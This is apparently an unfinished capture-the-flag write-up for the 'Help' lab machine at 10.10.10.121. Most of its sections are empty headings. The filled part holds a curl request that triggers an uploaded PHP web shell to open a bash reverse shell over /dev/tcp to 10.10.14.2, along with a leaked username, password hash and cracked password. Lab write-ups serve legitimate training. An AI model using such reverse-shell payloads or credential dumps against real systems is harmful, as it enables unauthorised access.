Name & IP Address of Machine:
> # HELP :`10.10.10.121`
**Table Of Contents:**
<!-- TOC -->

- [Synopsis](#synopsis)
- [`godhelpmeplz`](#godhelpmeplz)
- [Enumeration](#enumeration)
    - [Opened Ports:](#opened-ports)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

## Synopsis
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.121' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' -H $'Content-Length: 58' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'lang=english; PHPSESSID=l0qdvhg6md71rauhluvnr0lrc5' \
    --data-binary $'cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/10.10.14.2/9009+0>%261\"' \
    $'http://10.10.10.121/support/uploads/tickets/97b8c836b3cea3fa59e62fb187eb9f61.php'
```
```json
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```
`godhelpmeplz`
---

## Enumeration

---
#### Opened Ports: 
- [ ] x

---

## FootHold

---

## Lateral Movement

---

## Privilege Escalation

---